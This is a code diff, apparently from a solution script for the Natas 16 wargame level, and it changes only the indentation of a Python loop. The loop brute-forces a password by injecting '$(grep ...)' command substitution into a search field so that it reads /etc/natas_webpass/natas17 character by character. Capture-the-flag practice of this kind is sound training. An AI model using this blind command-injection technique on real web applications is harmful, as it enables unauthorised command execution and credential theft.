@@ -16,15 +16,15 @@ session = requests.Session()
 # response = requests.get(url, auth = (username, password))
 seen_password = list()
 while(len(seen_password) < 32):
-    for character in characters:
-        print("".join(seen_password) + character)
-        response = requests.post(url, data = { "needle": "anythings$(grep ^" + "".join(seen_password) + character + " /etc/natas_webpass/natas17)" }, auth = (username, password))
-        content = response.text
+	for character in characters:
+		print("".join(seen_password) + character)
+		response = requests.post(url, data = { "needle": "anythings$(grep ^" + "".join(seen_password) + character + " /etc/natas_webpass/natas17)" }, auth = (username, password))
+		content = response.text
 
-        returned = re.findall('<pre>\n(.*)\n</pre>', content)
+		returned = re.findall('<pre>\n(.*)\n</pre>', content)
 
-        if(not returned):
-            seen_password.append(character)
-            break
+		if(not returned):
+			seen_password.append(character)
+			break
 
 # print(re.findall('natas15 is (.*)<br>', content)[0])
